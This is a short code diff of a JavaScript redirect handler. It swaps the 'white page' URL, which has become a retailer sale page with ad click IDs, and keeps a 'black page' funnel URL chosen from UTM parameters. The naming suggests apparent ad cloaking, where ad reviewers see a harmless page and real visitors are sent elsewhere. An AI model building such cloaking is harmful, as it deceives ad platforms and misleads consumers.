@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://maxidnystore.com/products/vee-tumbler-blue";
+    const whitePageURL = "https://diners.com.pk/collections/men-sale?gad_source=1&gclid=CjwKCAiAk8G9BhA0EiwAOQxmfpA1WJFiEkjq0ONutNNpGTmfxgBqiBQge38k4tn5XNp8-1r6eCjvyRoC9wsQAvD_BwE";
     const blackPageURL = "https://IFRXJwhbvB.myfunnelish.com/imbassd-1736979042571105-1738006308191131";
   
     // Parse the UTM parameters from the request URL
